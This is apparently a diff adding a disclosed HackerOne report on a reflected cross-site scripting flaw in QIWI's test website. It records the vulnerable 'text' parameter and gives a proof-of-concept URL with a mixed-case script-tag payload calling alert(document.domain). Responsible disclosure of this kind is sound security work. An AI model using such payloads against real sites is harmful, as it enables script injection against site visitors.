@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/98281
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/hassham
+ReportedTo:QIWI(qiwi)
+BountyAmount:200.0
+Severity:
+State:Closed
+DateOfDisclosure:11.12.2015 17:12:28
+
+Summary:
+
+Dear Qiwi Team,
+ 
+Please find below link for POC for XSS vulnerability discovered in your website.
+
+Vulnerable Parameter: text
+
+Link : http://test.qiwi.ru/about/what/?purse=on&region=0&terminals=on&text=1'"()%26%25<acx><ScRiPt >alert(document.domain)</ScRiPt>
